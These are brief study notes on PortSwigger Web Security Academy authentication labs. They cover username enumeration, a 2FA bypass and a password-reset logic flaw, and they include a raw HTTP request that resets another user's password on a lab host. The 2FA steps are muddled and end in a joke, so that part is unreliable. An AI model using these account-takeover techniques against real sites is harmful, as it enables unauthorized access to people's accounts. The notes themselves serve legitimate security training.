# Authentication vulnerabilities

## Username enumeration via different responses

Use Intruder with username and pw as sniper targets

## 2FA simple bypass

1. Login as `wiener:peter`
1. Use portswigger e-mail to login with 2FA
1. capture e-mail change request into repeater
1. logout
1. login as `carlos:montoya`
1. copy session token from the new session
1. insert session token in the prev. captured request to change the e-mail
1. insert wrong code and login again as carlos
1. recieve 2FA code via e-mail
1. ???
1. Profit

##  Password reset broken logic

The `temp-forgot-password` parameter is not checked, so we can just send a
request in carlos' name

``` 
POST /forgot-password/?temp-forgot-password-token HTTP/2
Host: 0a3c00e903fa9e9980fe764f00c60058.web-security-academy.net
Cookie: session=ET1xcusj0lhDr3wWMSd1qCOcQLItAXnW
[...]

temp-forgot-password-token&username=carlos&new-password-1=bla&new-password-2=bla
```
